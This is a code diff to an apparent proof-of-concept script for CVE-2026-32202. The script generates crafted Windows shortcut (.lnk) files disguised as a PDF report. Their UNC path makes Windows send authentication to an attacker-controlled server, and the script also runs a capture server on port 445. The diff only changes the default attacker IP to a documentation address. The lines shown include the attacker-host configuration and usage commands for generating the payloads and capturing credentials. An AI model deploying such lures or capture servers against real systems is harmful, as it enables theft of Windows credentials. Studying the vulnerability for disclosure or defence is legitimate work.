@@ -89,7 +89,7 @@ class LNKConfig:
     fake_target: str = r"C:\Users\Public\Documents\report.pdf"
 
     # Actual UNC path (where Windows sends authentication)
-    unc_server: str = r"\\192.168.1.100"
+    unc_server: str = r"\\192.0.2.100"
     unc_share: str = "share"
     unc_path: str = r"docs\report.pdf"
 
@@ -783,7 +783,7 @@ class CVE2026_32202_Demo:
         self.server = None
         self.output_dir = Path("./cve-2026-32202-output")
 
-    def generate_lnk(self, scenario: int = 0, attacker_ip: str = "192.168.1.100",
+    def generate_lnk(self, scenario: int = 0, attacker_ip: str = "192.0.2.100",
                       output_dir: str = None) -> str:
         """Generate a crafted .lnk file for the specified scenario"""
         sc = SCENARIOS[scenario]
@@ -813,7 +813,7 @@ class CVE2026_32202_Demo:
 
         return str(filepath)
 
-    def generate_all_lnk(self, attacker_ip: str = "192.168.1.100",
+    def generate_all_lnk(self, attacker_ip: str = "192.0.2.100",
                           output_dir: str = None) -> List[str]:
         """Generate .lnk files for all scenarios"""
         files = []
@@ -1000,13 +1000,13 @@ def main():
         epilog="""
 Examples:
   # Generate all .lnk payloads
-  python cve_2026_32202.py generate --attacker 192.168.1.100
+  python cve_2026_32202.py generate --attacker 192.0.2.100
 
   # Start capture server
   python cve_2026_32202.py capture --port 445
 
   # Full demo (generate + capture)
-  python cve_2026_32202.py demo --attacker 192.168.1.100
+  python cve_2026_32202.py demo --attacker 192.0.2.100
 
   # Show attack flow diagram
   python cve_2026_32202.py explain
@@ -1021,7 +1021,7 @@ Examples:
 
     # Generate
     gen = sub.add_parser('generate', help='Generate crafted .lnk files')
-    gen.add_argument('--attacker', default='192.168.1.100', help='Attacker IP/hostname')
+    gen.add_argument('--attacker', default='192.0.2.100', help='Attacker IP/hostname')
     gen.add_argument('--scenario', type=int, default=-1, help='Scenario index (default: all)')
     gen.add_argument('--output', default='./cve-2026-32202-output', help='Output directory')
 
